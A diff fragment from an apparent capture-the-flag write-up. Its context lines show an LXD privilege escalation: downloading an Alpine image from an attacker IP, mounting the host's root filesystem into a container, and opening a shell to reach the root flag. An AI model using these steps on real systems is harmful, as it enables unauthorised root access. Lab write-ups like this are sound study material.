@@ -81,6 +81,7 @@ wget http:/IP:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
 * lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
 * lxc start ignite
 * lxc exec ignite /bin/sh
+
 ![image](https://github.com/lufffe/Writeups/assets/90646635/3f19636f-434d-48e7-885a-cec30c3765ea)
 
 * ### Flag Root.
